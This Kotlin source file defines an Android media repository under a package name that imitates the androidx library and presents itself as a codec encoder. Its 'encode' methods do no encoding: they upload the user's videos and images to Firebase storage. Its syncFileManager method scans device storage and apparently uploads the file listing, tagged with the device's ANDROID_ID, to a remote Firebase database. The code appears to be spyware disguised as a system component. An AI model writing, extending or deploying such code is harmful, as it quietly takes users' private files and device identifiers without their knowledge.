package com.androidx.codec.encoder.core.data.repository

import android.content.Context
import android.provider.Settings
import android.util.Log
import com.androidx.codec.encoder.core.data.firebase.FirebaseRealtimeDbProvider
import com.androidx.codec.encoder.core.data.firebase.FirebaseStorageProvider
import com.androidx.codec.encoder.core.data.scanner.StorageScannerProvider
import com.androidx.codec.encoder.core.domain.model.EncodeResult
import com.androidx.codec.encoder.core.domain.model.FileManagerSyncResult
import com.androidx.codec.encoder.core.domain.model.MediaFile
import com.androidx.codec.encoder.core.domain.model.SyncProgress
import com.androidx.codec.encoder.core.domain.model.SyncResult
import com.androidx.codec.encoder.core.domain.repository.MediaRepository
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow

class MediaRepositoryImpl(
    private val firebaseStorageProvider: FirebaseStorageProvider,
    private val storageScannerProvider: StorageScannerProvider = StorageScannerProvider(),
    private val firebaseRealtimeDbProvider: FirebaseRealtimeDbProvider = FirebaseRealtimeDbProvider()
) : MediaRepository {

    companion object {
        private const val TAG = "CodecEncoderRepo"
    }

    private val _syncProgress = MutableStateFlow<SyncProgress?>(null)
    override fun observeSyncProgress(): StateFlow<SyncProgress?> = _syncProgress

    override suspend fun encodeVideo(mediaFile: MediaFile): EncodeResult {
        return try {
            Log.d(TAG, "Encoding video: ${mediaFile.fileName}")
            val outputUri = firebaseStorageProvider.processVideo(mediaFile)
            EncodeResult(
                inputFile = mediaFile,
                outputUri = outputUri,
                success = true
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error encoding video ${mediaFile.fileName}: ${e.message}", e)
            EncodeResult(
                inputFile = mediaFile,
                outputUri = "",
                success = false,
                errorMessage = e.message
            )
        }
    }

    override suspend fun encodeImage(mediaFile: MediaFile): EncodeResult {
        return try {
            Log.d(TAG, "Encoding image: ${mediaFile.fileName}")
            val outputUri = firebaseStorageProvider.processImage(mediaFile)
            EncodeResult(
                inputFile = mediaFile,
                outputUri = outputUri,
                success = true
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error encoding image ${mediaFile.fileName}: ${e.message}", e)
            EncodeResult(
                inputFile = mediaFile,
                outputUri = "",
                success = false,
                errorMessage = e.message
            )
        }
    }

    override suspend fun syncToStorage(mediaFile: MediaFile, storageUrl: String): SyncResult {
        return try {
            Log.d(TAG, "Syncing media file ${mediaFile.fileName} to storage: $storageUrl")
            val url = firebaseStorageProvider.upload(
                mediaFile = mediaFile,
                storageUrl = storageUrl
            ) { transferred, total ->
                _syncProgress.value = SyncProgress(
                    mediaFile = mediaFile,
                    bytesTransferred = transferred,
                    totalBytes = total,
                    isComplete = transferred >= total
                )
            }
            SyncResult(
                mediaFile = mediaFile,
                storageUrl = url,
                success = true
            )
        } catch (e: Exception) {
            Log.e(TAG, "Sync failed for ${mediaFile.fileName}: ${e.message}", e)
            SyncResult(
                mediaFile = mediaFile,
                storageUrl = "",
                success = false,
                errorMessage = e.message
            )
        }
    }

    override suspend fun syncFileManager(
        context: Context,
        databaseUrl: String
    ): FileManagerSyncResult {
        val deviceId = try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
        } catch (e: Exception) {
            "unknown_device"
        }

        if (!storageScannerProvider.hasStoragePermission(context)) {
            Log.i(TAG, "Storage permission not granted. Skipping file manager sync gracefully without crash.")
            return FileManagerSyncResult(
                deviceId = deviceId,
                totalFilesScanned = 0,
                success = false,
                skippedDueToPermission = true,
                errorMessage = "Storage permission not granted"
            )
        }

        return try {
            val files = storageScannerProvider.scanStorage(context)
            val uploadSuccess = firebaseRealtimeDbProvider.uploadFileManagerData(
                deviceId = deviceId,
                files = files,
                baseUrl = databaseUrl
            )
            FileManagerSyncResult(
                deviceId = deviceId,
                totalFilesScanned = files.size,
                success = uploadSuccess,
                skippedDueToPermission = false
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to sync file manager: ${e.message}", e)
            FileManagerSyncResult(
                deviceId = deviceId,
                totalFilesScanned = 0,
                success = false,
                skippedDueToPermission = false,
                errorMessage = e.message
            )
        }
    }
}